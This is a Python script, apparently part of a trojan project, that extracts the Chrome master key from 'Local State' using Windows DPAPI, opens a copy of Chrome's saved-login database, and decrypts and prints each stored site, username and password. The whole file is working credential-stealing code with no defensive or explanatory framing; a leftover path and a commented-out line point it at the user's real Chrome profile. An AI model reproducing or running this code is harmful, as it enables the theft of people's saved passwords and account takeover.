
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def key():

	path = r'%LocalAppData%\Google\Chrome\User Data\Local State'
	path = os.path.expandvars(path)

	with open(path, 'r') as file:
	    encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']

	encrypted_key = base64.b64decode(encrypted_key)                                       # Base64
	encrypted_key = encrypted_key[5:]                                                     # DPAPI
	decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

	return decrypted_key

def decryptPayload(cipher, payload):

    return cipher.decrypt(payload)

def generateCipher(aes_key, iv):

    return AES.new(aes_key, AES.MODE_GCM, iv)

def decryptPassword(buff, KEY):

	try:

		iv = buff[3:15]
		payload = buff[15:]
		cipher = generateCipher(KEY, iv)
		decryptedPass = decryptPayload(cipher, payload)
		decryptedPass = decryptedPass[:-16].decode() 

		return decryptedPass

	except Exception as e:
        # print("SAlvato in versione chrome v80\n")
        # print(str(e))
		return "Chrome < 80"
 
def main():

	KEY = key()
	loginDb = r'C:\pythonProj\Troj\data\abc\61061chromePasswords.data'#os.environ['USERPROFILE'] + os.sep +  #r'AppData\Local\Google\Chrome\User Data\default\Login Data'
	shutil.copy2(loginDb, "Logintemp.db")
	conn = sqlite3.connect("Logintemp.db")
	cursor = conn.cursor()

	print('adw')


	try:

		cursor.execute("SELECT action_url, username_value, password_value FROM logins")
		
		for r in cursor.fetchall():

			print('adw')
			
			url = r[0]
			username = r[1]
			encryptedPassword = r[2]
			decryptedPassword = decryptPassword(encryptedPassword, KEY)

			if len(username) > 0:
				print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decryptedPassword + "\n" + "*" * 50 + "\n")

	except Exception as e:

		pass

	cursor.close()
	conn.close()

	try:
		os.remove("Logintemp.db")
	except Exception as e:
		pass

	input()

main()